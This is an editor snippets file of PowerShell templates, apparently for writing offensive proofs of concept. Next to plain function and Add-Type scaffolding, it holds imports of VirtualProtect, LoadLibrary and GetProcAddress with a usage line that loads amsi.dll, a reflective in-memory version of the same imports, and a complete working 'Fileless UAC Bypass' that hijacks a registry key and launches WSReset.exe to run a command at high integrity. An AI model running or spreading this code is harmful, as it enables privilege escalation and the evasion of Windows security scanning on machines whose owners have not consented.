{
  "[pocwriter] powershell add-type code only": {
    "scope": "powershell",
    "body": [
      "\\$code = @\"",
      "using System;",
      "using System.Runtime.InteropServices;",
      "",
      "namespace ${1:DotNetNamespace} {",
      "    public class ${2:ClassName} {",
      "        $0",
      "    }",
      "}",
      "\"@",
      "Add-Type \\$code"
    ],
    "prefix": [
      "Add-Type"
    ],
    "description": "powershell script template"
  },
  "[pocwriter] powershell invoke function in dll": {
    "scope": "powershell",
    "prefix": [
      "[DllImport(\""
    ],
    "body": [
      "// https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.dllimportattribute?view=net-9.0",
      "[DllImport(\"${1:kernel32.dll}\", EntryPoint = \"${3:FunctionName}\", ",
      "   CharSet = CharSet.Ansi, CallingConventions = CallingConvention::Winapi,",
      "   ExactSpelling = false, BestFitMapping = false, ThrowOnUnmappableChar = true",
      "   SetLastError = true",
      ")]",
      "public static extern ${2:IntPtr} ${3:FunctionName}(${4:TypeAndParams});"
    ],
    "description": "powershell invoke function in dll"
  },
  "[pocwriter] powershell dll import win32apis (VirtualProtect, LoadLibrary, GetProcAddress)": {
    "scope": "powershell",
    "body": [
      "\\$APIs = @\"",
      "using System;",
      "using System.Runtime.InteropServices;",
      "public class APIs {",
      "    [DllImport(\"kernel32\")]",
      "    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);",
      "    [DllImport(\"kernel32\")]",
      "    public static extern IntPtr LoadLibrary(string name);",
      "    [DllImport(\"kernel32\")]",
      "    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);",
      "}",
      "\"@",
      "Add-Type \\$APIs",
      "// Usage: \\$lib = [APIs]::LoadLibrary(\"amsi.dll\")"
    ],
    "prefix": [
      "Add-Type",
      "VirtualProtect",
      "LoadLibrary",
      "GetProcAddress"
    ],
    "description": "powershell dll import win32apis (VirtualProtect, LoadLibrary, GetProcAddress example)"
  },
  "[pocwriter] powershell reflective import dll": {
    "scope": "powershell",
    "body": [
      "function Get-ProcAddress {",
      "    Param(",
      "        [Parameter(Position = 0, Mandatory = \\$True)] [String] \\$Module,",
      "        [Parameter(Position = 1, Mandatory = \\$True)] [String] \\$Procedure",
      "    )",
      "",
      "    # Get a reference to System.dll in the GAC",
      "    \\$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |",
      "    Where-Object {  \\$_.GlobalAssemblyCache -And \\$_.Location.Split('\\')[-1].Equals('System.dll') }",
      "    \\$UnsafeNativeMethods = \\$SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')",
      "    # Get a reference to the GetModuleHandle and GetProcAddress methods",
      "    \\$GetModuleHandle = \\$UnsafeNativeMethods.GetMethod('GetModuleHandle')",
      "    \\$GetProcAddress = \\$UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
      "    # Get a handle to the module specified",
      "    \\$Kern32Handle = \\$GetModuleHandle.Invoke(\\$null, @(\\$Module))",
      "    \\$tmpPtr = New-Object IntPtr",
      "    \\$HandleRef = New-Object System.Runtime.InteropServices.HandleRef(\\$tmpPtr, \\$Kern32Handle)",
      "    # Return the address of the function",
      "    return \\$GetProcAddress.Invoke(\\$null, @([System.Runtime.InteropServices.HandleRef]\\$HandleRef, \\$Procedure))",
      "}",
      "",
      "function Get-DelegateType",
      "{",
      "    Param",
      "    (",
      "        [OutputType([Type])]",
      "            ",
      "        [Parameter( Position = 0)]",
      "        [Type[]]",
      "        \\$Parameters = (New-Object Type[](0)),",
      "            ",
      "        [Parameter( Position = 1 )]",
      "        [Type]",
      "        \\$ReturnType = [Void]",
      "    )",
      "",
      "    \\$Domain = [AppDomain]::CurrentDomain",
      "    \\$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')",
      "    \\$AssemblyBuilder = \\$Domain.DefineDynamicAssembly(\\$DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)",
      "    \\$ModuleBuilder = \\$AssemblyBuilder.DefineDynamicModule('InMemoryModule', \\$false)",
      "    \\$TypeBuilder = \\$ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])",
      "    \\$ConstructorBuilder = \\$TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, \\$Parameters)",
      "    \\$ConstructorBuilder.SetImplementationFlags('Runtime, Managed')",
      "    \\$MethodBuilder = \\$TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', \\$ReturnType, \\$Parameters)",
      "    \\$MethodBuilder.SetImplementationFlags('Runtime, Managed')",
      "        ",
      "    Write-Output \\$TypeBuilder.CreateType()",
      "}",
      "",
      "\\$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA",
      "\\$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])",
      "\\$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(\\$LoadLibraryAddr, \\$LoadLibraryDelegate)",
      "\\$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress",
      "\\$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])",
      "\\$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(\\$GetProcAddressAddr, \\$GetProcAddressDelegate)",
      "\\$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect",
      "\\$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])",
      "\\$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(\\$VirtualProtectAddr, \\$VirtualProtectDelegate)",
      "# Example usage:",
      "# \\$hModule = \\$LoadLibrary.Invoke('user32.dll')"
    ],
    "prefix": [
      "function Get-ProcAddress",
      "function Get-DelegateType",
      "LoadLibrary",
      "GetProcAddress",
      "VirtualProtect"
    ],
    "description": "powershell reflective import dll"
  },
  "[pocwriter] Create powershell function": {
    "scope": "powershell",
    "prefix": [
      "function"
    ],
    "body": [
      "function $1 {",
      "",
      "<#",
      ".SYNOPSIS",
      "    Returns ...",
      "",
      ".DESCRIPTION",
      "    $1 is a function that ....",
      "",
      ".PARAMETER $2",
      "     This is the $2.",
      "",
      ".EXAMPLE",
      "     'Server1', 'Server2' | $1",
      "",
      ".EXAMPLE",
      "     $1 ... (args)",
      "",
      ".INPUTS",
      "    String",
      "",
      ".OUTPUTS",
      "    String",
      "",
      ".NOTES",
      "    Author:  ",
      "    Website: ",
      "    Twitter: ",
      "#>",
      "",
      "[CmdletBinding()]",
      "    param (",
      "",
      ")",
      "",
      "#Function Body",
      "    $0",
      "}"
    ],
    "description": "simple powershell function template"
  },
  "[pocwriter] Fileless UAC Bypass by Abusing Shell API": {
    "scope": "powershell",
    "prefix": [
      "function Invoke-WSResetBypass {"
    ],
    "body": [
      "function Invoke-WSResetBypass {",
      "<#",
      ".SYNOPSIS",
      "Fileless UAC Bypass by Abusing Shell API",
      ".PARAMETER Command",
      "Specifies the command you would like to run in high integrity context.",
      " ",
      ".EXAMPLE",
      "Invoke-WSResetBypass -Command \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\"",
      "This will effectivly start cmd.exe in high integrity context.",
      ".NOTES",
      "This UAC bypass has been tested on the following:",
      " - Windows 10 Version 1803 OS Build 17134.590",
      " - Windows 10 Version 1809 OS Build 17763.316",
      "#>",
      "      Param (",
      "      [String]\\$Command = \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\"",
      "      )",
      "      \\$CommandPath = \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\"",
      "      \\$filePath = \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\"",
      "      New-Item \\$CommandPath -Force | Out-Null",
      "      New-ItemProperty -Path \\$CommandPath -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null",
      "      Set-ItemProperty -Path \\$CommandPath -Name \"(default)\" -Value \\$Command -Force -ErrorAction SilentlyContinue | Out-Null",
      "      Write-Host \"[+] Registry entry has been created successfully!\"",
      "      \\$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
      "      Write-Host \"[+] Starting WSReset.exe\"",
      "      Write-Host \"[+] Triggering payload..\"",
      "      Start-Sleep -Seconds 5",
      "      if (Test-Path \\$filePath) {",
      "      Remove-Item \\$filePath -Recurse -Force",
      "      Write-Host \"[+] Cleaning up registry entry\"",
      "      }",
      "}"
    ],
    "description": "Fileless UAC Bypass by Abusing Shell API"
  }
}